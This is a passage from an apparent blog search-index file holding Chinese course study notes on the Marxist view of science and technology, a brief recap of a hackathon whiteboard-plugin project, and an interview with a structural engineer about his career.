从15世纪下半叶近代自然科学产生以后，直到19世纪的上半叶，科学的实际应用才逐步显现效能。正如马克思所说：只有在资本主义条件下，才第一次产生了只有用科学方法才能解决的实际问题，才第一次达到使科学的应用成为可能和必要的那样一种规模，科学获得了成为致富手段的使用，发明成为一种特殊的职业，科学成为生产过程的因素，生产过程成为科学的应用。15世纪以后，科学实验活动融入科学研究20科学成就是在技术基础上的“技术科学化”的结果，技术可以产生科学，“技术科学化”表明:技术是科学发展的动力 ，科学需要推动技术前进；技术为科学的发展提供研究手段，特别是科学实 10.为什么说科学发展表现为继承与创新的统一？（p62）11.怎样认识技术发展的动力？对技术具有双刃剑作用的看法？技术发展史不断证明,技术像一把双刃剑,既有有益于人类发展的一面,也有危害人类利益的一面。一方面，技术的进步推动了生产力内部各要素的变革，促进了产业结构的调整、经济形式的变化和经济增长方式的变化，实现了经济转型；变革了生产关系，增进了人类自由而全面的发展，推动人类社会进入发展的新阶段；将人类从繁重的劳动中解放出来，对人类的生活方式产生了深刻的影响。另一方面，技术的进步也产生了一些道德和伦理问题，如克隆人的伦理问题、基因治疗和基因增强的伦理问题、网络伦理问题、核伦理问题等。 因此，必须以人民为中心，大力发展事关国计民生的科学技术；必须以先进的文化来引导，协调科学文化与人文文化的冲突；必须改变单纯有利于经济增长的倾向，走经济增长与环境保护双赢之路；必须客观全面评价科学技术的风险和收益，指定恰当的科学技术公共政策。 第二章 科学技术观1.如何理解18、19世纪科学技术发展与马克思、恩格斯科学技术思想产生的关系？18、19世纪，天文学、地理学、物理学、化学、解剖学、生物学等都有了长足的发展，特别是能量守恒与转化定律、细胞学说和生物进化论三大发现，使自然科学的发展进入了一个新时期，两次科技革命使人类进入了工业文明时代。马克思、恩格斯在总结和概括19世纪科学技术成果的基础上，形成了以辩证唯物主义为理论基础的科学技术思想。 2.怎样认识马克思、恩格斯的科学技术思想在马克思主义理论体系中的地位？马克思主义科学技术观是基于马克思、恩格斯的科学技术思想，对科学基础机器发展规律的概括和总结，是马克思主义关于科学技术的本体论和认识论。 从辩证唯物主义和历史唯物主义的基本立场出发，在总体上把握马克思、恩格斯的科学技术思想；马克思主义认为科学是一般生产力，技术是现实生产力；科学是认识世界，技术是改造世界。现代科学和技术形成既有区别又有联系的体系结构。 3.马克思、恩格斯和国外学者关于科学技术本质的分析有何主要差异？（1）马克思、恩格斯关于技术本质特征的分析 马克思、恩格斯认为技术在本质上体现了“人类对自然的实践关系”，技术是人的本质力量的对象化。 第一，劳动资料延长了人的自然的肢体。 第二，工艺学在本质上揭示出人对自然的能动关系。 第三，技术的发展引起生产关系的变革。 （2）国外学者对技术本质特征的研究 欧美技术哲学存在工程学的和人文主义的两种技术研究路线；日本的技术论在技术的本质问题上形成了“方法技能说”、“劳动手段说”、“知识应用说”等观点。这些观点各有特色，但大都表现出对技术理解的单一性。 我们需要用马克思主义科学技术观进行分析评价。马克思主义认为，技术是人类为满足自身的需要，在实践活动中根据实践经验或科学原理所创造发明的各种手段和方式方法的总和。主要体现在两个方面：一是技术活动，狭义的技术是指人类在利用自然、改造自然的劳动过程中所掌握的方法和手段；广义的技术是指人类改造自然、改造社会和改造人类自身的方法和手段。二是技术成果，包括技术理论、技能技巧、技术工艺与技术产品（物质设备）。 技术在本质上体现了人对自然的实践关系，是人的本质力量的展现，属于直接生产力，是自然性和社会性、物质性和精神性、中立性与价值性、主体性和客体性、跃迁性和积累性的统一。 4.如何理解科学技术一体化的特征？（1）现代科学的体系结构由学科结构和知识结构组成 学科结构由基础科学、技术科学、工程科学构成。知识结构由科学事实、科学概念、科学定律、科学假说、科学理论构成。现代科学的体系结构表现出现代科学的发展过程，其中学科结构形成立体的架构，知识结构各要素渗透在学科结构相对应的要素之中。基础科学、技术科学、工程科学都是系统化的知识，都会经过一个由科学事实到科学理论的形成过程。 （2）现代技术的体系结构由门类结构和形态结构组成 门类结构由实验技术、基本技术和产业技术构成。 形态结构由经验形态的技术、实体形态的技术和知识形态的技术构成。 现代技术的体系结构表现出现代技术的发展过程，其中门类结构是立体的架构，形态结构的各要素同样渗透咋门类结构相对应的要素当中。实验技术、基本技术和产业技术都包含经验技能，都使用工具机器，都蕴含了知识。 现代科学技术体系结构的研究表明，科学技术在各自的发展中，不但日益多样化和系统化，而且越来越呈现出科学技术一体化的特征。 5.为什么说科学发展表现为继承与创新的统一？继承：市科学技术发展中的量变，它可使科学知识延续、扩大和加深。科学是个开放系统，它在时间上有继承性，在空间上有积累性。只有继承已发现的科学事实、已有理论中的正确东西，科学才能发展、不断完善。 创新：是人类对自然的认识出现新的飞跃，引起科学发展中的质变。创新是继承的必然趋势和目的。 在科学技术的发展模式及动力问题上，马克思主义认为科学发展在纵向上表现为渐进与飞跃的统一，在横向上表现为分化与综合的统一，在总体趋势上表现为继承与创新的统一。 技术的发展由社会需要、技术目的及科学进步等多种因素共同推动。其中社会需求与技术发展水平之间的矛盾是技术发展的基本动力，技术目的和技术手段之间的矛盾是技术发展的直接动力，科学进步是技术发展的重要推动力。 6.怎样认识技术发展的动力？马克思主义认为，技术的发展由社会需要、技术目的以及科学进步等多种因素共同推动。 （1）社会需求与技术发展水平之间的矛盾是技术发展的基本动力 任何技术，最早都源于人类的需要。正是为了生存发展的需要，人类起初模仿自然，进而进行创造，发明了各种技术。同时，文化对技术发展具有明显的张力作用。先进的思想文化会推动技术的发展，而落后的思想文化则会制约和阻碍技术的发展，包括影像技术决策、技术研发以及技术成果的产业化各方面。 （2）技术目的和技术手段之间的矛盾是技术发展的直接动力 技术目的就是在技术实践过程中在观念上预先建立的技术结果的主观形象，是技术实践的内在要求，影响并贯穿技术实践的全过程。技术手段即实现技术目的中介因素，包括实现技术目的的工具和实用工具的形式。技术目的的提出和实现，必须依赖于与之相匹配的技术手段。技术手段是实现技术目的的中介和保证，它包括达到技术功能要求所使用的工具以及应用工具的方式。 （3）科学进步是技术发展的重要推动力 19世纪中期以后，科学走到了技术前面，成为技术发展的理论向导。科学革命导致技术革命，技术发展对科学进步的依赖程度越来越高，技术已成为科学的应用。尤其是当今社会的发展，已形成了科学技术一体化的双向互动过程。 第三章 科学技术方法论1.如何理解马克思主义科学技术方法论与科学研究中的具体方法的关系？马克思主义的科学技术方法论是以辩证唯物主义立场、观点为基础，吸取具体科学技术研究中的基本方法，并对其进行概括和升华的方法论。 科学技术研究，离不开辩证思维。分析与综合、归纳与演绎、从抽象到具体、历史与逻辑的统一，这些辩证思维的形式体现和贯彻在科学家、工程师的具体科学技术研究中。自觉的认识和提升这些辩证思维的形式，对于树立，马克思主义科学技术观，深入研究科学技术，建设创新型国家具有重要意义。 2.如何理解辩证思维渗透在科学研究的全部过程中？马克思主义科学技术方法论的核心就是辩证思维。马克思主义科学技术方法论的基本原则就是把辩证法贯彻到科学技术研究中，以对立统一、质量互变和否定之否定的辩证思想渗透到具体的科学技术研究中，把握具体科学技术的研究过程。 3.如何把握创造性思维特性？创造是科学研究和技术发明最重要特性之一。创造性思维不是在所有辩证思维和科学研究方法之外独立的一种思维方式或方法，是能够提出创见的思维，与一般性思维相比，是在思维特征方面不刻板，组合各种思维、灵活调用思维的特性。 创造性思维的特点是思维方向的求异性，思维结构的灵活性、思维进程的飞跃性、思维效果的整体性、思维表达的新颖性等。 创造性思维特别注重逻辑思维与非逻辑思维的统一、抽象思维与形象思维的辩证统一。 4.注意多学科的交叉与融贯有何方法论意义？移植和学科交叉或跨学科的研究方法，是创造性思维的两种非常有效的研究方法。当代科学研究和技术发明变得越来越复杂，进行移植与交叉，通过多学科或跨学科的研究，常常能够获得单一学科研究无法获得的创新成果。多学科融合或通过跨学科研究问题也是当代科学和技术解决问题的创造性方法，体现了广泛联系和发展的辩证法。 当代各门科学之间的交叉型越来越大，通过学科之间的交叉往往可以获得新的认识，带来创新。学科交叉成为一种新的思考方式和研究方法。 所谓学科交叉方法，就是两门以上的学科之间在面对同一研究对象时，从不同学科的角度进行比对研究的方法。借鉴其他学科的研究，思考本学科的问题和对象，融合其他学科的研究方法，以达到对研究对象的新认识。 所谓跨学科方法就是通过多学科的协作共同解决同一问题的方法，跨学科也是一种学科融合的方法，也可以称为多维融贯的方法。 5.战略性思维对于科学研究有何意义？战略性思维是对战略科学家的思维要求。同时对于一个从事一般科学研究、技术发明和工程建设的科学家也有重要意义。习近平非常重视战略性思维的重要作用与深刻意义，是其提出的“六大思维”之一，战略性思维对于科学研究而言，非常重要。 战略性思维是高瞻远瞩、统揽全局、善于把握事物发展总体趋势和方向的思维方法，展示的是看问题的高度和深度。古人讲：“不谋万世者，不足谋一时；不谋全局者，不足谋一域。”科学家与工程师没有战略性思维、具有什么样的战略性思维，一定程度上决定着在中国特色社会主义伟大事业中的科学技术研究能登多高、能走多远、将抵达何处。战略性思维能力的强弱，取决于思考问题的高度、理论研究的深度、知识视野的广度，以及对于科学技术发展全局的时间跨度的认识与把握。 对于国家而言，科学技术的总体规划是一种科学技术研究的战略，战略科学家需要掌握国家科学技术的基本战略，按照国家需要，结合自己及其研究团队的研究确定科学研究方向。 第四章 科学技术社会论1.为什么说“科学是一种在历史上起推动作用的、革命的力量”？ 科学技术是历史发展的火车头，改变了社会历史进程，造就了新的社会形态;推动了生产力内部各要素的变革，引发了产业结构的调整、经济形式的变化和经济增长方式的转变，造就了经济转型;产生了技术异化现象，要对异化的资本主义制度展开批判，更好地发挥科学技术的社会功能。 科学技术作为社会发展的动力,是马克思主义的基木观点。科学是生产力的“知识的形态”。作为生产力的科学技术，能够大大提高社会生产力水平，推动着整个人类物质生产的迅猛发展。 作为强大的精神力量的科学技术，能够促进人类思想的解放，在产业革命的基础上，推动社会变革，对社会生产关系产生有力影响。 作为人类最终走向白由的科学技术，能够作为解放的杠杆，增进人类精神生活的丰富性和自我发展能力，有助于实现人的全面自由的发展。 2.如何看待科学技术对人的异化和对自然的异化？ 科技异化实质上是在资本主义制度下劳动异化和人的异化一种必然结果。由于劳动是人的最根本最现实的实践活动，是人及人类社会存在的根本方式，劳动的异化必然带来人的其他社会活动和社会关系的全面异化，科学技术也不例外，因为“宗教、家庭、国家、法、道德、科学、艺术等等，都不过是生产的一些特殊的方式，并且受生产的普遍规律的支配。” 因此，科学技术作为劳动亦即人处理自身与自然界关系的社会活动的产物，也必然随着资本主义社会劳动的异化而表现出异化的现象。最根本的是要消灭对科学技术的资本主义利用方式，把现代科学技术从资本主义制度下解放出来。也就是说只有通过无产阶级革命来最终解决资本主义的科技异化问题。当然，在马克思看来，异化的完全克服只有在共产主义社会制度中才能最终实现。 3.科学技术的社会体制和组织机构对科学技术的发展有何意义？ 科学技术的社会建制有一个历史过程。经济支持制度、法律保障体系等科学技术体制是根本，各种组织机构及其科研组织运行是保证，科学技术的伦理规范是导引。在科学技术发展应用的新阶段，科学技术的社会建制呈现出一些新特点，因此必须进行科学技术体制改革，以保证科学技术的良好运行。 作为社会建制的科学技术体制是在一定社会价值观念支配下，依据相应的物质设备条件形成的一种社会组织制度，旨在支持推动人类对自然的认识和利用。科学技术的体制化以相应的职业化为核心，其内涵随着科学技术的发展而不断拓展和丰富。科学技术的社会体制包括:组织领导体制、经济支持制度、法律保障体制、交流与传播体制、人才教育培养制度等。科学技术与其他各种事业密切相关,需要建立相应的组织机构以保证科学技术活动的顺利进行。科学技术组织机构随着历史的演化而变化，具有各白的特点和功能，是实现科学技术现代化的组织保证。在科学技术社会史上形成与发展起来的组织机构有:科学技术决策、管理与咨询机构，科学技术活动组织机构，科学技术传播机构，科学技术人才培养机构。 【以下摘白百度贴吧帖子“科学技术的社会体制化及其对科学发展的意义”】科学技术体制化的内容包括:科学技术的投入体制、科技研究的结构比例、科学技术的法律制度、科技研究的管理体制。科学技术的社会体制化对科学发展的意义:1、它可以积聚社会上的力量来进行柑应的科学研究;2、当代科技活动的结构中基础研究将会有大量的人员参l与j;3、明确的法律以及管理制度将会更进一步促进科学技术的发展。 4.为什么要对科学技术工作者进行伦理规范？ 科学技术活动与人类其他活动一样，建立在诚信和道德的基础上。现阶段，默顿的科学的精神气质受到挑战，科学技术工作者有失范行为，需要制定相关科研诚信指南和工程师伦理准则加以规范。科学工作者进行科学研究和医学实践，尤其是进行人体实验和动物实验，应该遵循社会伦理、生命伦理、动物伦理等。技术工作者，尤其是工程师，在工程技术活动中，应该遵循一定的职业伦理和社会伦理准则，应该承担对社会、专业、雇主和同事的责任，应该对工程的环境影响负有特别的责任，规范白己的行为，为人类福祉和环境保护服务。 5.如何理解科学技术文化与人文文化之间的冲突与协调？(一）社会文化对科学技术的影响 科学技术的产生和发展需要一定的社会文化环境。社会文化与科学技术文化紧密关联，并由此影响科学技术的发展及其应用。默顿在《十七世纪英格兰的科学、技术与社会》中提出的“清教主义促进英国近代科学的制度变化”，以及“李约瑟难题”——“近代科学为什么没有在中国诞生”的解答，就说明了这一点。 (二）科学文化与人文文化的协调 1．要防止科学在生活世界、自然世界对人文的僭越所造成的科学文化与人文文化之间的冲突，深刻理解科学的限度，用正确的人文理念指导我们的生活。 2．必须以社会先进文化来引领科学技术文化，使科学技术发展和应用为经济社会健康全面发展服务。得到广泛提倡的环境科学技术就是为了协调人与自然之间的关系所做的努力，是科学技术文化与人文文化——绿色文化的良性互动产物。 6.科学技术的风险有哪些？如何恰当地进行科学技术风险评价与决策？ 科学技术的风险包括环境风险、政治风险、经济风险、健康风险和伦理风险等。这些风险会引发一系列争论，造成评价和决策上的困难。习近平指出:“要加快建立科技咨询支撑行政决策的科技决策机制，加强科技决策咨询系统，建设高水平科技智库。要加快推进重大科技决策制度化，解决好实际存在的部门领导拍脑袋、科技专家看颜色行事等问题。” 要恰当进行科学技术风险评价与决策，就应该全面评价科学技术风险—收益的多个方面，批判性地考察“内部”存有争议的科学知识或技术知识，分析相互竞争的利益集团和社会结构的”外部”政治学，理解科学技术专家知识和决策的局限性、公众理解科学的必要性以及外行知识的优势，明确政府、科学技术专家以及公众在与科学技术风险相关的公共决策中的不同作用，确立公众参与决策的可能方式，从而形成最优化的科学技术公共政策模式，以达到对科学技术风险社会有效治理的目的。 第五章 中国马克思主义科学技术观1.为什么说新时代中国马克思主义科学技术是一个科学、完整的思想理论体系？ 毛泽东、邓小平、……、胡锦涛、习近平的科学技术思想，是在中国共产党领导我国科学技术事业发展和进行社会主义现代化建设的伟大时间中，逐渐形成、发展和完善的。 中国马克思主义科学技术观是基于马克思、恩格斯的科学技术思想，对当代科学技术机器发展规律的概括和总结，是马克思主义科学技术论的重要组成部分。 中国马克思主义科学技术观是中国共产党人集体智慧的结晶，是对毛泽东、邓小平、……、习近平科学技术思想的概括和总结，是他们科学技术思想的理论升华和飞跃，是他们科学技术思想的凝练和精髓。 中国马克思主义科学技术观的内容丰富，涉及了科学技术的功能、目标、机制、战略、人才和方针等重大问题，是一个科学、完整的思想理论体系。 2.如何理解中国马克思主义科学技术观的理论精髓？ 中国马克思主义科学技术观概括和总结了毛泽东、邓小平、···、习近平等的科学技术思想，包括科学技术的功能观、战略观、人才观、和谐观和创新观的基木内容，体现出时代性、实践性、科学性、创新性、自主性、人本性等特征，建设中国特色的创新型国家，是中国马克思主义科学技术观的具体体现。中国马克思主义科学技术观，是马克思主义科学技术观与中国具体科学技术实践相结合的产物，是马克思主义科学技术论的重要组成部分。 3.如何理解习近平新时代中国特色社会主义思想中的科学技术观的时代意义？ 中国马克思主义科学技术观的三个历史阶段是其各自所处的历史条件所决定的，是对时代背景实事求是的反映，因此科学技术思想都镌刻了时代的烙印，反映了时代的需求。 习近平新时代中国特色社会主义思想中的科学技术观，是在中国特色社会主义进入新时代的历史条件下形成的。新时代之“新”，一是在于我们进入了一个新的发展阶段，发展环境、发展条件都发生了新的变化，目标任务也发生了新的变化;二是在于我们面临着新的社会主义主要矛盾;三是我们迈向新的奋斗目标。正是基于这一新时代的”新”特征时代背景，习近平立足于我贵哦科学技术与社会发展的现实需要，提出了一系列关于科学技术发展的理论观点，形成了习近平新时代中国特色社会主义科学技术观。","tags":[],"categories":[{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"声网参赛经历记录——白板插件开发(前端)","date":"2023-10-27T01:24:02.561Z","path":"Z_杂记/声网参赛分享/","text":"[toc] # 比赛创意最开始讨论的结果时做一个会议记录相关的插件，结合声望原本提供的白板插件功能，可以实时的进行展示，多人操作、互动，音视频通话。区别于现有会议模式的一点就是，除了音视频通话，还可以在通话的同时，在白板上进行操作，类似于Web上 在线文档、在线会议、在线画板 三者功能集一身的一款白板插件，当然这里在线白板的功能是由声望的 SDK 提供了这个能力，在线文档的这些具体的在线同步的逻辑还是要以声望提供的为基准。 1. 最终结果最终由于我们人力有限，并且都是兼职参加比赛，所以完成上是大打折扣。 调用了讯飞的实时语音识别接口实现了插件的 语音转写 功能，可以进行多人语音识别到插件内部 可以对会议内容和识别记录进行 一键导出 的功能 最后呢，由于实现的功能过于单调，又新增了一个 Markdown 的编辑器，插件启动后可以编辑，但是这个内容是不同步的。 # 技术总结总结一下我个人在比赛中学习和使用到的一些技术，由于我本人是 C++客户端 开发，之前虽然也有学习过VUE和前端知识，但是 VUE3 的改动还是挺大，使用起来颇有些不太习惯的地方。主要的前端框架以及代码功能都是由我比赛的队友去完成的。我负责后台数据相关的一些工作。主要面向于音视频录制、存储、发送等，以及调用语音识别接口。 AgoraRTC(声网的sdk，提供实时音视频服务) IatRecorder(讯飞封装的一个语音识别接口) Vue 前端三剑客（js、h5、CSS）这三个在调试过程中占比很大 # 实现实现部分主要讲关于音频传输、录音、实时语音转写这三点： 音频传输音频传输方面。声网有现成的demo提供学习，使用起来相对比较简单。 API-Examples-Web&#x2F;Demo&#x2F;selfRendering at main · AgoraIO&#x2F;API-Examples-Web","tags":[{"name":"声网","slug":"声网","permalink":"http://example.com/tags/%E5%A3%B0%E7%BD%91/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"},{"name":"RTC","slug":"RTC","permalink":"http://example.com/tags/RTC/"},{"name":"音视频","slug":"音视频","permalink":"http://example.com/tags/%E9%9F%B3%E8%A7%86%E9%A2%91/"},{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"}],"categories":[{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"访谈记录","date":"2023-10-27T01:24:02.560Z","path":"Z_杂记/访谈记录/","text":"[toc] 人文环境的形成是常年累月的积淀，是人的改造与自然的打磨巧妙结合形成的，因此也蕴含了独特的精神力量和难得的物质底色。从物质文化和精神文化两个角度来看，对人文环境中的建筑进行设计所受到的牵制较多。纵向看，有历史文化的影响；横向看，有地域因素的制约；另一个方面，观者的审美角度、使用者的生活习惯，以及人们道德规范的约束都是人文环境中对建筑消隐的重要因素。在这种情况下，做到“消隐”，需要设计师考虑各方面的因素，从而做出更能突出建筑特，又能达到“消隐”目的的设计方案。以下结合三个相对典型的案例进行具体的分析。 建筑设计环节需要考虑的因素除了人文环境、造价、风格之外，也应考虑到建筑技术对建筑设计的提升。不仅如此，建筑技术可以说是建筑创作中重要的一个环节，其最终体现在建筑的空间形态上，建筑形态是否优美、是否达到了效果，又可以直接反馈出建筑技术的使用情况。建筑技术的要素包括材料、结构、施工等不同的类别，从选材到施工，每一个技术环节都有其对应的使用环境，充分利用这一特定环境，从而有效地利用建筑技术对每个环节进行改造和提升。这也能充分体现环境整体观的理念。 社会访谈： 一名工程师眼中的新时代及启示深入访谈一个自己的长辈，请其介绍职业经历和人生阅历，并通过这个切入点，以小见大介绍其对国家发展的看法感受，记述其访谈内容及对自己未来的启示。 访谈对象：访谈对象：同学的舅舅 性别：男 年龄：48 职业：结构工程师 单位：中建一局某分公司 职务：工程师 从业年数：22 访谈时间：2022.11.26 访谈形式：电话 访谈内容： 您是如何找到这份工作的？ 当时工作还是包分配的，毕业后我选择了去中建。 就您的工作而言，您最喜欢什么？最不喜欢什么？ 喜欢的是自己和大家一起努力工作之后，出现的问题被解决，工程一日日逐渐被完成，最终被交付的那种喜悦。 不喜欢工作中的与人打交道，在工作中会产生内耗，需要处理好复杂的人际关系。还有就是工作常年在外，全国各地地跑，和家人是聚少离多。不过工作这么些年，也习惯了，有空间就会回家看看家人，这两年因为疫情的原因，回去的更少了。在单位，就是想着怎么把工作干好。保质保量完成建设任务。 您的职位是什么？你的主要职责是什么？ 目前是项目部的工程师，主要职责就是负责工程上的项目进行监工以及项目部规划等内容。 大学期间可以做的准备有什么？ 学好自己的专业知识，尽量拓展知识面。这个岗位对专业的对口性一般要求不高，但是不论是经济类、管理类还是工程类的专业，还是需要认真学习的，它虽然要求的面广，但你总得有一方面是要有核心竞争力的。尽量多学习其他知识，做到“见多识广”，因为这个岗位会遇到很多人，很多不同种类的项目，这样工作起来思维会比较快，沟通也会变得容易些。 有侧重的锻炼自己的沟通、写作、表达能力。多参加社团活动，和一些有意义的比赛，历练自己。 在行业内，先从什么样的工作岗位做起，能学到最多的知识，最有益于发展？ 先应聘资料员或质检员、施工员,能利用在校学到的知识,工作起来顺手,工作后通过自学尽快掌握各种工程软件的应用,掌握后根据自己的爱好,可转行预算员、技术员、测量员等. 工作地点在哪里？主要工作场所是什么？有哪些特征？ 工作地点有工地，项目部。主要场所是项目部。忙的时候来回奔波，也会加班赶工期。 您在做这份工作时，日常面临的问题是什么，什么最有挑战性？ 这个很多，比如刚开始工作的时候，要慢慢适应工厂的环境;还要和同事打好关系等等。特别是厂里的一些老师傅在我们正式上岗前经行培训的时候，老师傅传授了一些我们在学校里没见过的加工方法，我们只能从头学起。我想说的是学校里的教材之类的不能太过相信，有些老旧的教材的内容已经逐渐被淘汰，因此要不断地学习，要关注行业发展动态。 在您的工作领域里初级职位和略高级别职位的薪水一般是什么水平？ 收入还可以，包括基本工资+年底奖金。主要还是根据工程难度，工期长短，以及工作地点等因素影响。初级平均可以拿到8000左右，年底5~20万不等。 在这个职位上，如果想获得成功必须拥有并保持什么样的能力？ 需要有坚实的基础学科知识，更需要有不断学习的能力，去挑战的新的建设需求。其次的话就是有一定的与人交往的能力。 目前还缺乏的必须改进的能力有哪些？ 需要的技能：CAD及各种计算软件，比如PKPM、YJK、3D3S、MIDAS等（至少学会一到两种，各软件有相通之处）。 您认为什么样的个人品质、性格和能力对做好这份工作来讲是重要的？ 能坚持下去，有创新思想，常与人沟通交流，通过工作不断积累自己的经验。 您认为做好这份工作应该具备哪些知识、技能和经验？ 要掌握一些基本的专业知识，比如制图（包括CAD)，金属加工的技艺，还有就是一些行业规定，行业语言等，之后当然要考取这种证书来表明已经掌握了这些内容。当然，经验也是很重要的，特别是出现一些课本上或平时没出现过的情况时，经验显得尤为重要。 目前，行业内要求从事这份工作的人应该有什么准备？ 首先梳理自己已有的专业知识能力，客观地评价自己的优势和劣势，尽可能做到扬长补短。其次有目的地提前锁定一些目标实习单位，有针对性地进行一些关注和调研，做到有的放矢。最后可以阅读一些人际交往或社交礼仪的知识，力求在细节方面也做到位，也可以向往届师兄师姐讨教实习的一些鲜活的经验，以利于较快地适应角色和心态的转变。 学校中的哪些课程对这个行业比较有帮助？ 总的来说是有帮助的，但是大家都知道，书上的知识永远赶不上技术的发展，所有如果你向在这个行业有好的发展的话，就不能局限于书本上的东西，要多动手，这样能学到的东西比你课程上所能学到的多很多。 行业内，单位对刚进入该领域工作的员工一般会提供哪些培训？ 每一个新进入的员工都会进行一系列相关的培训，内容主要是对新来员工培训相关技能，让员工能够更好的将学校中所学到的知识更好的转化为想用的技能。除了部门自己组织的学习以外，公司每年都会组织一些培训，让大家更好的了解当前行业的新技术，新动态。正式进入工作岗位后，要求每个人都有一定的技能，能够独立面对一些问题，在技术方面要求会比较多。在深造方面，公司是比较支持大家进行更加高层的学习。 这个行业存在的困难及前景如何？ 目前这一行业工作较为辛苦，有很多人难以坚持下来，现有的人员构成并不是非常合理，尽管做这个方面的人相当多，但是很缺少能够独当一面的优秀人才，总的来说就是，高层然才比较欠缺，低层人员泛滥。所以，对于每一个想要在此行业有所发展的人来说，机遇和挑战是同时并存的。","tags":[],"categories":[{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"中国马克思主义科学技术观","date":"2023-10-27T01:24:02.559Z","path":"Z_杂记/中国马克思主义科学技术观/","text":"[toc] 第四章、科学技术社会论1. 为什么说“科学是一种在历史上起推动作用的、革命的力量”？ &nbsp;&nbsp;科学技术是历史发展的火车头，改变了社会历史进程，造就了新的社会形态;推动了生产力内部各要素的变革，引发了产业结构的调整、经济形式的变化和经济增长方式的转变，造就了经济转型;产生了技术异化现象，要对异化的资本主义制度展开批判，更好地发挥科学技术的社会功能。&nbsp;&nbsp;科学技术作为社会发展的动力,是马克思主义的基木观点。科学是生产力的“知识的形态”。作为生产力的科学技术，能够大大提高社会生产力水平，推动着整个人类物质生产的迅猛发展。&nbsp;&nbsp;作为强大的精神力量的科学技术，能够促进人类思想的解放，在产业革命的基础上，推动社会变革，对社会生产关系产生有力影响。&nbsp;&nbsp;作为人类最终走向白由的科学技术，能够作为解放的杠杆，增进人类精神生活的丰富性和自我发展能力，有助于实现人的全面自由的发展。 2. 如何看待科学技术对人的异化和对自然的异化？ &nbsp;&nbsp;科技异化实质上是在资本主义制度下劳动异化和人的异化一种必然结果。由于劳动是人的最根本最现实的实践活动，是人及人类社会存在的根本方式，劳动的异化必然带来人的其他社会活动和社会关系的全面异化，科学技术也不例外，因为“宗教、家庭、国家、法、道德、科学、艺术等等，都不过是生产的一些特殊的方式，并且受生产的普遍规律的支配。” &nbsp;&nbsp;因此，科学技术作为劳动亦即人处理自身与自然界关系的社会活动的产物，也必然随着资本主义社会劳动的异化而表现出异化的现象。最根本的是要消灭对科学技术的资本主义利用方式，把现代科学技术从资本主义制度下解放出来。也就是说只有通过无产阶级革命来最终解决资本主义的科技异化问题。当然，在马克思看来，异化的完全克服只有在共产主义社会制度中才能最终实现。 3. 科学技术的社会体制和组织机构对科学技术的发展有何意义？ &nbsp;&nbsp;科学技术的社会建制有一个历史过程。经济支持制度、法律保障体系等科学技术体制是根本，各种组织机构及其科研组织运行是保证，科学技术的伦理规范是导引。在科学技术发展应用的新阶段，科学技术的社会建制呈现出一些新特点，因此必须进行科学技术体制改革，以保证科学技术的良好运行。&nbsp;&nbsp;作为社会建制的科学技术体制是在一定社会价值观念支配下，依据相应的物质设备条件形成的一种社会组织制度，旨在支持推动人类对自然的认识和利用。科学技术的体制化以相应的职业化为核心，其内涵随着科学技术的发展而不断拓展和丰富。科学技术的社会体制包括:组织领导体制、经济支持制度、法律保障体制、交流与传播体制、人才教育培养制度等。科学技术与其他各种事业密切相关,需要建立相应的组织机构以保证科学技术活动的顺利进行。科学技术组织机构随着历史的演化而变化，具有各白的特点和功能，是实现科学技术现代化的组织保证。在科学技术社会史上形成与发展起来的组织机构有:科学技术决策、管理与咨询机构，科学技术活动组织机构，科学技术传播机构，科学技术人才培养机构。 【以下摘白百度贴吧帖子“科学技术的社会体制化及其对科学发展的意义”】科学技术体制化的内容包括:科学技术的投入体制、科技研究的结构比例、科学技术的法律制度、科技研究的管理体制。科学技术的社会体制化对科学发展的意义:1、它可以积聚社会上的力量来进行柑应的科学研究;2、当代科技活动的结构中基础研究将会有大量的人员参l与j;3、明确的法律以及管理制度将会更进一步促进科学技术的发展。 4. 为什么要对科学技术工作者进行伦理规范？ &nbsp;&nbsp;科学技术活动与人类其他活动一样，建立在诚信和道德的基础上。现阶段，默顿的科学的精神气质受到挑战，科学技术工作者有失范行为，需要制定相关科研诚信指南和工程师伦理准则加以规范。科学工作者进行科学研究和医学实践，尤其是进行人体实验和动物实验，应该遵循社会伦理、生命伦理、动物伦理等。技术工作者，尤其是工程师，在工程技术活动中，应该遵循一定的职业伦理和社会伦理准则，应该承担对社会、专业、雇主和同事的责任，应该对工程的环境影响负有特别的责任，规范白己的行为，为人类福祉和环境保护服务。 5. 如何理解科学技术文化与人文文化之间的冲突与协调？ (一）社会文化对科学技术的影响&nbsp;&nbsp;科学技术的产生和发展需要一定的社会文化环境。社会文化与科学技术文化紧密关联，并由此影响科学技术的发展及其应用。默顿在《十七世纪英格兰的科学、技术与社会》中提出的“清教主义促进英国近代科学的制度变化”，以及“李约瑟难题”——“近代科学为什么没有在中国诞生”的解答，就说明了这一点。 (二）科学文化与人文文化的协调&nbsp;&nbsp;1．要防止科学在生活世界、自然世界对人文的僭越所造成的科学文化与人文文化之间的冲突，深刻理解科学的限度，用正确的人文理念指导我们的生活。&nbsp;&nbsp;2．必须以社会先进文化来引领科学技术文化，使科学技术发展和应用为经济社会健康全面发展服务。得到广泛提倡的环境科学技术就是为了协调人与自然之间的关系所做的努力，是科学技术文化与人文文化——绿色文化的良性互动产物。 6. 科学技术的风险有哪些？如何恰当地进行科学技术风险评价与决策？ &nbsp;&nbsp;科学技术的风险包括环境风险、政治风险、经济风险、健康风险和伦理风险等。这些风险会引发一系列争论，造成评价和决策上的困难。习近平指出:“要加快建立科技咨询支撑行政决策的科技决策机制，加强科技决策咨询系统，建设高水平科技智库。要加快推进重大科技决策制度化，解决好实际存在的部门领导拍脑袋、科技专家看颜色行事等问题。” 要恰当进行科学技术风险评价与决策，就应该全面评价科学技术风险—收益的多个方面，批判性地考察“内部”存有争议的科学知识或技术知识，分析相互竞争的利益集团和社会结构的”外部”政治学，理解科学技术专家知识和决策的局限性、公众理解科学的必要性以及外行知识的优势，明确政府、科学技术专家以及公众在与科学技术风险相关的公共决策中的不同作用，确立公众参与决策的可能方式，从而形成最优化的科学技术公共政策模式，以达到对科学技术风险社会有效治理的目的。 第五章、中国马克思主义科学技术观1. 